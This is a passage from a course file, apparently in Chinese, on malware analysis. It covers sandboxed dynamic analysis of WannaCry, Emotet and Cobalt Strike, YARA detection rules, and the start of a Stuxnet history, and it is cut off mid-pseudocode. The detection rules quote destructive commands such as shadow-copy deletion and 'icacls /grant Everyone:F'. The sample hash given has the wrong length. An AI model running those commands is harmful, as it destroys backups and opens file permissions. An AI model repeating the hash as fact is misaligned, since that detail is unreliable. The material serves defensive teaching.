data-cp=\"3\"></div>\n\n<h3>动态分析：让恶意软件\"活\"起来</h3>\n\n<p>静态分析告诉你恶意软件<strong>能</strong>做什么，动态分析告诉你它<strong>实际</strong>做了什么。我们在隔离的虚拟机中运行样本，同时用多个监控工具记录它的一切行为。</p>\n\n<h4>环境准备</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 动态分析前的准备工作（在 Windows 分析 VM 中）\n\n# 1. 创建干净快照\n# VirtualBox: 快照 → 拍摄快照 → \"pre-analysis-clean\"\n\n# 2. 启动监控工具\n# 打开 Process Monitor (ProcMon):\nprocmon.exe /AcceptEula /BackingFile C:\\analysis\\procmon_log.pml\n\n# 3. 启动网络监控\n# Wireshark 开始捕获\n# 或使用 INetSim 模拟网络服务（在 REMnux 上）:\nsudo inetsim --data-directory /tmp/inetsim_data\n\n# 4. 拍摄注册表快照（用于对比）\nregshot /first /output C:\\analysis\\regshot_before.hiv\n\n# 5. 记录初始进程列表\ntasklist /v > C:\\analysis\\processes_before.txt\n\n# 6. 运行样本（在管理员命令提示符中）\nmalware_sample.exe\n\n# 7. 等待 2-5 分钟，让恶意行为充分展现\n# 然后停止所有监控工具\n\n# 8. 拍摄第二次注册表快照\nregshot /second /output C:\\analysis\\regshot_after.hiv\nregshot /compare</code></pre></div>\n\n<h4>行为监控：看恶意软件做了什么</h4>\n\n<p>Process Monitor 是动态分析的核心工具。它记录每一个文件操作、注册表修改和网络连接：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">ProcMon 捕获的 WannaCry 行为日志（过滤后）:\n\n时间        操作          路径/详情                              结果\n────────    ────────      ──────────────────────────────────     ──────\n14:23:01    CreateFile    C:\\Windows\\tasksche.exe                SUCCESS\n14:23:01    RegSetValue   HKLM\\...\\Run\\tasksche                  SUCCESS\n                         → \"C:\\Windows\\tasksche.exe\" /s\n14:23:02    CreateFile    C:\\Windows\\12754\\TaskStart.cmd         SUCCESS\n14:23:02    WriteFile     → 写入内容:\n                         icacls . /grant Everyone:F /T /C /Q\n                         icacls .. /grant Everyone:F /T /C /Q\n14:23:03    CreateFile    C:\\WINDOWS\\system32\\attrib.exe         SUCCESS\n14:23:03    CreateFile    C:\\Users\\Admin\\Documents\\*.doc         SUCCESS\n14:23:03    CreateFile    C:\\Users\\Admin\\Documents\\*.pdf         SUCCESS\n14:23:03    CreateFile    C:\\Users\\Admin\\Documents\\*.jpg         SUCCESS\n                         → 搜索并加密所有用户文件\n14:23:05    TCP Connect   192.168.1.1:445                        SUCCESS\n14:23:05    TCP Connect   192.168.1.2:445                        SUCCESS\n14:23:06    TCP Connect   192.168.1.3:445                        SUCCESS\n                         → 扫描内网 SMB 端口进行横向传播\n14:23:10    UDP Send      DNS 查询:\n                         iuqerfsodp9ifjaposdfjhgosurijfaewr...com\n                         → Kill Switch 检查</code></pre></div>\n\n<h4>调试器分析：逐指令跟踪</h4>\n\n<p>当你需要精确理解某段代码的逻辑时，调试器是你的利器。我们用x64dbg来跟踪一个恶意软件的解密例程：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">x64dbg 调试会话 —— 跟踪 Emotet 的字符串解密:\n\n1. 在可疑的字符串处理函数入口设断点:\n   bp 0x004A1230\n\n2. 单步跟踪 (F7 = Step Into, F8 = Step Over):\n\n   地址         指令                    寄存器状态\n   ────         ────────               ──────────\n   004A1230     push ebp               EBP = 0x0019FF00\n   004A1231     mov ebp, esp           ESP = 0x0019FEF8\n   004A1233     sub esp, 0x100         ← 分配 256 字节局部变量\n   004A1239     mov ecx, [ebp+8]      ECX = 加密字符串指针\n   004A123C     mov edx, 0x5A         EDX = XOR 密钥 (0x5A)\n   \n   ; 解密循环:\n   004A1241     mov al, [ecx]          ← 读取加密字节\n   004A1243     xor al, dl             ← XOR 解密\n   004A1245     mov [ebp+eax-0x100], al\n   004A124B     inc ecx\n   004A124C     cmp al, 0              ← 到字符串结尾了吗？\n   004A124E     jnz short 0x004A1241   ← 继续循环\n   \n3. 在内存窗口查看解密结果:\n   0x0019FE00: \"hxxps://185.156.73[.]54/gate.php\"\n   0x0019FE40: \"POST /gate.php HTTP/1.1\"\n   0x0019FE80: \"Content-Type: application/x-www-form-urlencoded\"\n\n   → 成功提取 C2 通信地址！</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">调试技巧</div>\n<p>很多恶意软件使用<strong>反调试技术</strong>。常见的手法包括：<code>IsDebuggerPresent()</code>检查、<code>NtQueryInformationProcess</code>、时间差检测（<code>RDTSC</code>指令）、以及检测硬件断点。在x64dbg中，你可以使用ScyllaHide插件来绕过这些检测。</p>\n</div>\n\n<h4>网络流量分析</h4>\n\n<p>大多数恶意软件都需要与C2服务器通信。捕获和分析网络流量可以揭示C2基础设施：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Wireshark 捕获的 Cobalt Strike Beacon 通信:\n\n── DNS 查询阶段 ──\nDNS: Standard query A cdn-update.microsoft-edge.com\nDNS: Standard query A 142.250.80.46\n\n── HTTP 信标（初始注册） ──\nGET /updates/ HTTP/1.1\nHost: cdn-update.microsoft-edge.com\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)\nCookie: session=bW9kdWxlPSZ0eXBlPXdpbjExJnVzZXI9YWRtaW4=\n\n  Base64 解码 Cookie:\n  \"module=&type=win11&user=admin\"  ← 系统指纹\n\n── HTTP 信标（任务轮询） ──\nGET /updates/check?ver=4.5 HTTP/1.1\nCookie: session=<加密的任务请求>\n\n── HTTP 响应（服务器下发指令） ──\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\nContent-Length: 256\n\n  [加密的任务数据]\n  → 解密后可能包含：shell命令、文件下载指令、进程注入指令\n\n通信特征:\n  - 周期性信标（默认 60 秒 ± 抖动）\n  - 使用 HTTPS 加密\n  - URL 路径伪装为合法软件更新\n  - Cookie 中传输编码后的元数据</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"4\"></div>\n\n<h3>综合实战：分析一个未知的 Dropper</h3>\n\n<p>让我们将静态和动态分析结合起来，分析一个\"未知样本\"（模拟真实场景）：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"\n恶意软件快速静态分析脚本\n用途：自动化提取 PE 文件的关键特征\n\"\"\"\n\nimport pefile\nimport hashlib\nimport ssdeep  # 模糊哈希，用于家族关联\nimport struct\nfrom datetime import datetime\n\ndef analyze_pe(filepath):\n    pe = pefile.PE(filepath)\n    results = {}\n    \n    # 1. 文件哈希\n    with open(filepath, 'rb') as f:\n        data = f.read()\n    results['md5'] = hashlib.md5(data).hexdigest()\n    results['sha256'] = hashlib.sha256(data).hexdigest()\n    results['ssdeep'] = ssdeep.hash(data)\n    \n    # 2. PE 基本信息\n    results['compile_time'] = datetime.fromtimestamp(\n        pe.FILE_HEADER.TimeDateStamp\n    ).isoformat()\n    results['entry_point'] = hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)\n    results['machine'] = hex(pe.FILE_HEADER.Machine)\n    \n    # 3. 导入表分析\n    suspicious_imports = {\n        'LoadLibraryA', 'GetProcAddress', 'VirtualAlloc',\n        'WriteProcessMemory', 'CreateRemoteThread',\n        'NtUnmapViewOfSection', 'SetThreadContext',\n        'URLDownloadToFileA', 'InternetOpenA',\n        'CryptEncrypt', 'CryptDecrypt'\n    }\n    results['imports'] = []\n    results['suspicious_apis'] = []\n    \n    for entry in pe.DIRECTORY_ENTRY_IMPORT:\n        dll = entry.dll.decode()\n        for imp in entry.imports:\n            name = imp.name.decode() if imp.name else f\"ord_{imp.ordinal}\"\n            results['imports'].append(f\"{dll}!{name}\")\n            if name in suspicious_imports:\n                results['suspicious_apis'].append(f\"{dll}!{name}\")\n    \n    # 4. 节区分析\n    results['sections'] = []\n    for s in pe.sections:\n        results['sections'].append({\n            'name': s.Name.decode().rstrip('\\x00'),\n            'virtual_size': s.Misc_VirtualSize,\n            'raw_size': s.SizeOfRawData,\n            'entropy': round(s.get_entropy(), 2)\n        })\n    \n    # 5. 资源提取（可能包含嵌入的 PE 文件）\n    if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):\n        for res_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:\n            if hasattr(res_type, 'directory'):\n                for res_id in res_type.directory.entries:\n                    if hasattr(res_id, 'directory'):\n                        for res_lang in res_id.directory.entries:\n                            offset = res_lang.data.struct.OffsetToData\n                            size = res_lang.data.struct.Size\n                            results['resources'] = results.get('resources', [])\n                            results['resources'].append({\n                                'offset': hex(offset),\n                                'size': size\n                            })\n    \n    return results\n\n# 使用示例\n# report = analyze_pe(\"unknown_dropper.exe\")\n# for key, value in report.items():\n#     print(f\"{key}: {value}\")</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">分析工作流建议</div>\n<p>推荐的恶意软件分析流程：<strong>先静后动</strong>。首先用静态分析了解样本的基本特征和可能的行为，然后有针对性地设计动态分析实验。如果静态分析发现样本有反调试技术，你需要先准备反反调试措施，再启动调试器。</p>\n</div>\n\n<h3>小结</h3>\n\n<p>你已经掌握了两把\"手术刀\"：</p>\n<ul>\n<li><strong>静态分析</strong>：哈希识别 → PE结构解剖 → 字符串提取 → 反汇编/反编译。安全、高效，是分析的第一步。</li>\n<li><strong>动态分析</strong>：环境准备 → 行为监控 → 调试跟踪 → 网络分析。揭示真实行为，但需要在隔离环境中进行。</li>\n<li><strong>综合分析</strong>：两种方法互为补充。静态分析发现的加密例程可以用动态调试来跟踪解密过程；动态分析捕获的C2地址可以用静态搜索来定位相关代码。</li>\n</ul>\n\n<p>下一节，我们将学习一种更高效的检测方法——<strong>YARA规则</strong>。当你能手动分析一个样本后，下一步就是把你的发现转化为自动化检测规则。</p>\n\n<div class=\"checkpoint\" data-cp=\"5\"></div>";
+
+SECTION_CONTENT["malw-02-01"] = "<h2>YARA 规则编写：从样本分析到自动化检测</h2>\n\n<p>假设你刚刚分析完一个WannaCry样本，提取了它的特征——特定的导入表组合、独特的字符串模式、特殊的代码结构。现在问题来了：如何在你管理的10万台终端中快速找出所有被感染的机器？手动逐一检查不现实。你需要一种<strong>自动化检测</strong>方法。</p>\n\n<p>这就是YARA的用武之地。YARA（Yet Another Ridiculous Acronym）是恶意软件分析师的\"瑞士军刀\"——它让你用简洁的规则描述恶意软件的特征，然后在海量文件中自动搜索匹配。</p>\n\n<h3>YARA 基础语法</h3>\n\n<p>YARA规则的结构非常直观。让我们从一个最简单的规则开始：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">/* \n * YARA 规则结构:\n * rule 规则名 {\n *     meta:    → 元数据（作者、描述、参考）\n *     strings: → 匹配模式（字符串、十六进制、正则）\n *     condition: → 触发条件\n * }\n */\n\nrule demo_example {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"演示规则：检测包含 PowerShell 下载命令的文件\"\n        date = \"2024-01-15\"\n    \n    strings:\n        // 文本字符串匹配\n        $ps1 = \"powershell\" ascii wide nocase\n        $download = \"Invoke-WebRequest\" ascii wide nocase\n        $hidden = \"-WindowStyle Hidden\" ascii wide nocase\n        \n        // 十六进制模式匹配\n        $hex_pattern = { 4D 5A 90 00 }  // MZ 头 + DOS stub 开头\n        \n        // 正则表达式匹配\n        $url_pattern = /https?:\\/\\/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/\n    \n    condition:\n        // 满足任意 2 个字符串条件\n        2 of ($ps*, $download, $hidden) or ($hex_pattern and $url_pattern)\n}</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">YARA 字符串修饰符</div>\n<p><code>ascii</code>：匹配ASCII编码。<code>wide</code>：匹配UTF-16LE编码（Windows内部常用）。<code>nocase</code>：不区分大小写。建议同时使用ascii和wide，因为恶意软件可能使用任意一种编码。</p>\n</div>\n\n<h3>实战：编写 WannaCry 检测规则</h3>\n\n<p>让我们基于之前的静态分析结果，编写一套完整的WannaCry检测规则。</p>\n\n<h4>规则 1：基于字符串特征</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">rule WannaCry_Ransomware_Strings {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"检测 WannaCry 勒索软件的字符串特征\"\n        reference = \"https://securelist.com/wannacry-ransomware/78645/\"\n        hash = \"ed01ebfbc9eb5bbea545af4bb0156eb2f87cfb75a4605108\"\n        date = \"2024-01-15\"\n        severity = \"critical\"\n        malware_family = \"WannaCry\"\n    \n    strings:\n        // Kill Switch 域名（WannaCry 独有特征）\n        $killswitch = \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" ascii\n        \n        // 勒索信内容\n        $ransom1 = \"Oops, your files have been encrypted!\" ascii wide\n        $ransom2 = \"Wanna Decryptor\" ascii wide\n        $ransom3 = \"Send $300 worth of Bitcoin\" ascii wide\n        \n        // 加密相关的独特字符串\n        $ext1 = \".WNCRY\" ascii\n        $ext2 = \".WNCRYT\" ascii\n        \n        // 文件名特征\n        $file1 = \"tasksche.exe\" ascii wide nocase\n        $file2 = \"mssecsvc.exe\" ascii wide nocase\n        $file3 = \"@Please_Read_Me@.txt\" ascii wide\n        \n        // 命令行特征\n        $cmd1 = \"icacls . /grant Everyone:F /T /C /Q\" ascii\n    \n    condition:\n        // PE 文件 + 至少 3 个特征匹配\n        uint16(0) == 0x5A4D and  // MZ header\n        3 of them\n}</code></pre></div>\n\n<h4>规则 2：基于代码结构（更健壮）</h4>\n\n<p>字符串容易被修改（加壳、混淆），但代码结构更难改变。让我们提取WannaCry的导入表特征：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">import \"pe\"  // 导入 PE 模块\n\nrule WannaCry_PE_Structure {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"基于 PE 结构特征检测 WannaCry\"\n        malware_family = \"WannaCry\"\n        severity = \"critical\"\n    \n    strings:\n        // WannaCry 的独特 API 组合\n        $api1 = \"CryptGenRandom\" ascii\n        $api2 = \"CryptImportKey\" ascii\n        $api3 = \"CryptEncrypt\" ascii\n        \n        // 文件遍历 API\n        $find1 = \"FindFirstFileW\" ascii\n        $find2 = \"FindNextFileW\" ascii\n        \n        // 网络传播相关\n        $smb1 = \"NetServerEnum\" ascii\n        $smb2 = \"NetShareEnum\" ascii\n    \n    condition:\n        uint16(0) == 0x5A4D and\n        // 文件大小在合理范围内（WannaCry 约 3.4MB）\n        filesize < 5MB and\n        // 加密 API 组合\n        all of ($api*) and\n        // 文件遍历\n        1 of ($find*) and\n        // 导入表特征：使用 pe 模块\n        pe.number_of_sections >= 6 and\n        pe.imports(\"ADVAPI32.dll\", \"CryptEncrypt\") and\n        pe.imports(\"KERNEL32.dll\", \"FindFirstFileW\")\n}</code></pre></div>\n\n<h4>规则 3：使用十六进制模式（对抗变种）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">rule WannaCry_Encryption_Routine {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"检测 WannaCry 加密例程的字节码特征\"\n        malware_family = \"WannaCry\"\n    \n    strings:\n        // RSA 公钥加密 AES 密钥的代码片段\n        // 这段代码在 WannaCry 的所有变种中基本不变\n        $rsa_import = {\n            6A 00                    // push 0\n            6A 01                    // push 1 (PUBLICKEYBLOB)\n            8B 45 ??                 // mov eax, [ebp+??]\n            50                       // push eax\n            FF 15 ?? ?? ?? ??        // call CryptImportKey\n            85 C0                    // test eax, eax\n            74 ??                    // je short (失败跳转)\n        }\n        \n        // AES-128-CBC 初始化向量设置\n        $aes_init = {\n            C7 45 ?? 01 00 00 00     // mov [ebp+??], 1 (AES mode)\n            C7 45 ?? 00 01 00 00     // mov [ebp+??], 256 (key bits)\n            8D 45 ??                 // lea eax, [ebp+??]\n            50                       // push eax\n            FF 15 ?? ?? ?? ??        // call CryptSetKeyParam\n        }\n        \n        // 文件写入头 \"WANACRY!\" 魔数\n        $wancry_magic = { 57 41 4E 41 43 52 59 21 }\n    \n    condition:\n        uint16(0) == 0x5A4D and\n        ($wancry_magic or ($rsa_import and $aes_init))\n}</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">十六进制通配符</div>\n<p>在YARA的十六进制模式中，<code>??</code> 是单字节通配符（匹配任意字节），用于跳过不确定的地址偏移。你还可以使用范围：<code>[4-6]</code> 匹配4-6个任意字节，<code>[-]</code> 匹配任意数量的字节。</p>\n</div>\n\n<h3>编写 Cobalt Strike Beacon 检测规则</h3>\n\n<p>Cobalt Strike是红队常用工具，但也被攻击者广泛使用。检测它的Beacon是YARA的高级应用：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">import \"pe\"\nimport \"elf\"\n\nrule CobaltStrike_Beacon {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"检测 Cobalt Strike Beacon 载荷\"\n        reference = \"https://blog.talosintelligence.com/cobalt-strike/\"\n        severity = \"critical\"\n        malware_family = \"CobaltStrike\"\n    \n    strings:\n        // Beacon 配置块特征（版本 4.x）\n        $config_start = { 00 01 00 01 00 02 }  // 配置块头部\n        $beacon_config = \"%.s.%s.%s\" ascii     // 配置模板字符串\n        \n        // Beacon 特有的 API 调用模式\n        $pipe1 = \"\\\\\\\\.\\\\pipe\\\\MSSE-\" ascii\n        $pipe2 = \"\\\\\\\\.\\\\pipe\\\\postex_\" ascii\n        $pipe3 = \"\\\\\\\\.\\\\pipe\\\\status_\" ascii\n        \n        // 睡眠函数中的特征（beacon 的 sleep 实现）\n        $sleep_mask = { \n            48 89 5C 24 ??     // mov [rsp+??], rbx\n            57                 // push rdi\n            48 83 EC 20        // sub rsp, 0x20\n            48 8B D9           // mov rbx, rcx\n            E8 ?? ?? ?? ??     // call sleep_masked\n        }\n        \n        // Beacon 反射 DLL 注入特征\n        $reflective = \"ReflectiveLoader\" ascii\n        $dll_main = \"DllMain\" ascii\n        \n        // HTTP 信标特征\n        $user_agent = \"Mozilla/5.0 (compatible; MSIE\" ascii\n        $header1 = \"Cookie: \" ascii\n        $header2 = \"session=\" ascii\n    \n    condition:\n        (\n            uint16(0) == 0x5A4D and  // PE 文件\n            (\n                // 方式 1：命名管道特征\n                1 of ($pipe*)\n            ) or (\n                // 方式 2：配置块 + 反射加载\n                $config_start and $reflective\n            ) or (\n                // 方式 3：睡眠掩码 + HTTP 特征\n                $sleep_mask and all of ($header*)\n            )\n        )\n        or\n        // 也可以检测 shellcode 形式的 Beacon\n        (\n            // Beacon shellcode 的入口模式\n            $sleep_mask at 0 or\n            (filesize < 500KB and $reflective and 1 of ($pipe*))\n        )\n}</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"6\"></div>\n\n<h3>YARA 进阶技巧</h3>\n\n<h4>减少误报：组合条件</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">import \"pe\"\nimport \"hash\"\n\nrule Generic_Ransomware_Detection {\n    meta:\n        author = \"CyberEdu Lab\"\n        description = \"通用勒索软件检测（适用于多种家族）\"\n    \n    strings:\n        // 勒索信常见关键词\n        $ransom_word1 = \"encrypted\" ascii wide nocase\n        $ransom_word2 = \"bitcoin\" ascii wide nocase\n        $ransom_word3 = \"decrypt\" ascii wide nocase\n        $ransom_word4 = \"ransom\" ascii wide nocase\n        $ransom_word5 = \"payment\" ascii wide nocase\n        \n        // 加密 API 组合\n        $crypto1 = \"CryptEncrypt\" ascii\n        $crypto2 = \"CryptGenKey\" ascii\n        $crypto3 = \"CryptExportKey\" ascii\n        $crypto4 = \"CryptDestroyKey\" ascii\n        \n        // 卷影副本删除（几乎所有勒索软件都会执行）\n        $vss_delete1 = \"vssadmin delete shadows /all /quiet\" ascii wide nocase\n        $vss_delete2 = \"wmic shadowcopy delete\" ascii wide nocase\n        $vss_delete3 = \"wbadmin delete catalog\" ascii wide nocase\n        \n        // 常见勒索扩展名\n        $ext1 = \".locked\" ascii\n        $ext2 = \".encrypted\" ascii\n        $ext3 = \".crypted\" ascii\n    \n    condition:\n        uint16(0) == 0x5A4D and\n        pe.is_pe and\n        (\n            // 路径 A: 勒索关键词 + 加密 API + 卷影删除\n            (3 of ($ransom_word*)) and (2 of ($crypto*)) and (1 of ($vss_delete*))\n            or\n            // 路径 B: 大量勒索扩展名 + 加密 API\n            (3 of ($ext*)) and (2 of ($crypto*))\n        )\n}</code></pre></div>\n\n<h4>使用 YARA 模块</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">import \"pe\"\nimport \"dotnet\"\nimport \"math\"\n\nrule Suspicious_PE_Characteristics {\n    meta:\n        description = \"检测具有可疑特征的 PE 文件\"\n    \n    condition:\n        // 基础 PE 检查\n        pe.is_pe and\n        \n        // 检查 1: 入口点不在 .text 节区（可能加壳）\n        pe.entry_point >= pe.sections[pe.number_of_sections - 1].raw_data_offset and\n        \n        // 检查 2: 节区名称异常\n        (\n            for any section in pe.sections: (\n                section.name == \".UPX0\" or\n                section.name == \".UPX1\" or\n                section.name == \".themida\" or\n                section.name == \".aspack\"\n            )\n        ) and\n        \n        // 检查 3: 资源中嵌入可执行文件\n        (\n            for any resource in pe.resources: (\n                math.entropy(resource.offset, resource.length) > 7.5\n            )\n        ) and\n        \n        // 检查 4: 导入表过小（少于 5 个函数，可能是壳的导入表）\n        pe.number_of_imports < 5 and\n        \n        // 检查 5: 编译时间在合理范围\n        pe.timestamp > 1000000000  // 2001 年之后\n}</code></pre></div>\n\n<h4>测试你的 YARA 规则</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 1. 语法验证\nyara -C my_rule.yar  # 编译规则，检查语法\n\n# 2. 对单个样本测试\nyara my_rule.yar wannacry_sample.exe\n# 输出: WannaCry_Ransomware_Strings wannacry_sample.exe\n\n# 3. 对目录批量扫描\nyara -r my_rule.yar /path/to/malware/collection/\n# -r: 递归扫描子目录\n\n# 4. 显示匹配的字符串\nyara -s my_rule.yar suspicious_file.exe\n# 输出:\n# WannaCry_Ransomware_Strings suspicious_file.exe\n# 0x1234:$killswitch: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\n# 0x5678:$ext1: .WNCRY\n\n# 5. 使用多规则文件扫描\nyara -r rules/ /path/to/scan/\n\n# 6. 性能测试（处理大目录）\nyara -r -p 4 --fast-scan rules/ /path/to/endpoint/files/\n# -p 4: 使用 4 个线程\n# --fast-scan: 快速模式（找到第一个匹配就停止）\n\n# 7. 生成规则统计\nyara -r --print-stats rules/ /path/to/samples/ | sort -n</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">常见陷阱</div>\n<p><strong>避免过度宽泛的规则</strong>：一个只匹配 \"powershell\" 的规则会产生海量误报。确保你的condition足够严格。<br>\n<strong>测试良性样本</strong>：用你的规则扫描一组已知的良性文件（Windows系统文件、常用软件），确认不会产生误报。<br>\n<strong>版本管理</strong>：恶意软件会变异。定期更新规则，并使用 <code>ssdeep</code> 或 <code>imphash</code> 来关联变种。</p>\n</div>\n\n<h3>YARA 规则管理最佳实践</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"\nYARA 规则自动化测试框架\n用于验证规则的准确性和性能\n\"\"\"\n\nimport yara\nimport os\nimport json\nfrom pathlib import Path\n\nclass YaraTester:\n    def __init__(self, rules_dir):\n        self.rules_dir = Path(rules_dir)\n        self.results = {\"true_positive\": 0, \"false_positive\": 0,\n                       \"true_negative\": 0, \"false_negative\": 0}\n    \n    def compile_rules(self):\n        \"\"\"编译所有 YARA 规则\"\"\"\n        rule_files = {}\n        for yar_file in self.rules_dir.glob(\"*.yar\"):\n            namespace = yar_file.stem\n            rule_files[namespace] = str(yar_file)\n        self.rules = yara.compile(filepaths=rule_files)\n        print(f\"[*] 已编译 {len(rule_files)} 个规则文件\")\n    \n    def test_sample(self, filepath, expected_family=None):\n        \"\"\"测试单个样本\"\"\"\n        matches = self.rules.match(filepath)\n        matched_rules = [str(m) for m in matches]\n        \n        if expected_family:\n            # 已知恶意样本\n            if any(expected_family in rule for rule in matched_rules):\n                self.results[\"true_positive\"] += 1\n                print(f\"  [TP] {filepath}: {matched_rules}\")\n            else:\n                self.results[\"false_negative\"] += 1\n                print(f\"  [FN] {filepath}: 期望 {expected_family}, 得到 {matched_rules}\")\n        else:\n            # 良性样本\n            if matched_rules:\n                self.results[\"false_positive\"] += 1\n                print(f\"  [FP] {filepath}: {matched_rules}\")\n            else:\n                self.results[\"true_negative\"] += 1\n    \n    def report(self):\n        \"\"\"输出测试结果统计\"\"\"\n        total = sum(self.results.values())\n        tp = self.results[\"true_positive\"]\n        fp = self.results[\"false_positive\"]\n        fn = self.results[\"false_negative\"]\n        \n        precision = tp / (tp + fp) if (tp + fp) > 0 else 0\n        recall = tp / (tp + fn) if (tp + fn) > 0 else 0\n        \n        print(f\"\\n{'='*50}\")\n        print(f\"测试结果统计:\")\n        print(f\"  真阳性 (TP): {tp}\")\n        print(f\"  假阳性 (FP): {fp}\")\n        print(f\"  真阴性 (TN): {self.results['true_negative']}\")\n        print(f\"  假阴性 (FN): {fn}\")\n        print(f\"  精确率: {precision:.2%}\")\n        print(f\"  召回率: {recall:.2%}\")\n        print(f\"{'='*50}\")\n\n# 使用示例:\n# tester = YaraTester(\"./rules/\")\n# tester.compile_rules()\n# tester.test_sample(\"./malware/wannacry.exe\", \"WannaCry\")\n# tester.test_sample(\"./benign/notepad.exe\")  # 良性样本\n# tester.report()</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"7\"></div>\n\n<h3>小结</h3>\n\n<p>YARA是将你的分析经验转化为自动化检测能力的桥梁。在这一节中，你学会了：</p>\n<ul>\n<li><strong>基础语法</strong>：meta、strings、condition三大组成部分</li>\n<li><strong>多种匹配方式</strong>：文本字符串、十六进制模式、正则表达式、PE模块</li>\n<li><strong>实战规则</strong>：为WannaCry和Cobalt Strike编写了多层次检测规则</li>\n<li><strong>减少误报</strong>：通过组合条件、使用PE模块、控制匹配阈值</li>\n<li><strong>测试验证</strong>：使用自动化框架验证规则的精确率和召回率</li>\n</ul>\n\n<p>记住，好的YARA规则就像好的侦探直觉——它来自于大量样本分析的经验积累。分析越多恶意软件，你的规则就会越精准。</p>";
+
+SECTION_CONTENT["malw-03-01"] = "<h2>从 Stuxnet 到现代威胁：恶意软件进化史</h2>\n\n<p>2010年6月，白俄罗斯一家安全公司的技术人员在排查一台\"异常重启\"的电脑时，发现了一个前所未见的恶意软件。这个发现震惊了整个安全界——他们发现了<strong>Stuxnet</strong>，人类历史上第一个真正的\"网络武器\"。它不仅是一个恶意软件，更是一个价值数亿美元、由国家级团队开发的网络战工具。</p>\n\n<p>从Stuxnet到今天，恶意软件已经从\"极客的恶作剧\"进化为\"国家级武器\"和\"数十亿美元的犯罪产业\"。在这一节中，我们将深入分析几个里程碑式的恶意软件家族，从它们的代码中学习恶意软件的演化规律。</p>\n\n<h3>Stuxnet (2010)：网络战的开端</h3>\n\n<h4>攻击目标：伊朗纳坦兹铀浓缩设施</h4>\n\n<p>Stuxnet的目标极其精确：伊朗纳坦兹铀浓缩工厂中的西门子S7-300 PLC（可编程逻辑控制器），这些PLC控制着铀浓缩离心机的转速。Stuxnet的任务是让离心机在物理上被摧毁，同时向操作员显示一切正常的假数据。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Stuxnet 攻击链全景:\n\n┌─────────────────────────────────────────────────────────────┐\n│                    初始感染阶段                               │\n│  受感染的 USB → 利用 LNK 漏洞 (CVE-2010-2568)               │\n│  → 加载 Rootkit 驱动                                        │\n│  → 搜索 Siemens Step7 软件                                  │\n├─────────────────────────────────────────────────────────────┤\n│                    横向移动阶段                               │\n│  → 利用 Windows Print Spooler 漏洞 (CVE-2010-2729)          │\n│  → 利用 Windows Server 服务漏洞 (CVE-2008-4250)             │\n│  → 利用 Windows Task Scheduler 漏洞 (CVE-2010-2568)         │\n│  → 通过共享文件夹传播                                        │\n├─────────────────────────────────────────────────────────────┤\n│                    目标定位阶段                               │\n│  → 检测 Siemens Step7 是否安装                               │\n│  → 连接到 PLC (S7-300 系列)                                 │\n│  → 检查变频器数量 (≥33台才激活)                              │\n│  → 确认是铀浓缩离心机 (特定频率范围)                          │\n├─────────────────────────────────────────────────────────────┤\n│                    破坏执行阶段                               │\n│  → 修改离心机转速: 1410 Hz → 1280 Hz → 2 Hz (反复)         │\n│  → 向 SCADA 系统发送录制的\"正常\"数据                         │\n│  → 离心机物理损坏，操作员看到正常读数                         │\n└─────────────────────────────────────────────────────────────┘</code></pre></div>\n\n<h4>Stuxnet 的代码特征</h4>\n\n<p>Stuxnet使用了4个零日漏洞（当时前所未有）、多个Rootkit、偷取的数字证书，以及高度模块化的代码架构：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">// Stuxnet 的 PLC 注入逻辑（反编译伪代码）\n// 这是注入到西门子 Step7 中的恶意 DLL\n\nvoid hook_s7comm_write() {\n    // Hook Step7 与 PLC 之间的通信\n    \n    if (target_plc_type == S7_300 && \n        connected_vfds >= 33) {          // 至少33台变频器\n        // 检查变频器是否连接在正确的总线上\n        for (int i = 0; i < num_vfds; i++) {\n            freq = read_vfd_frequency(i);\n            if (freq >= 807 && freq <= 1210) {\n                // 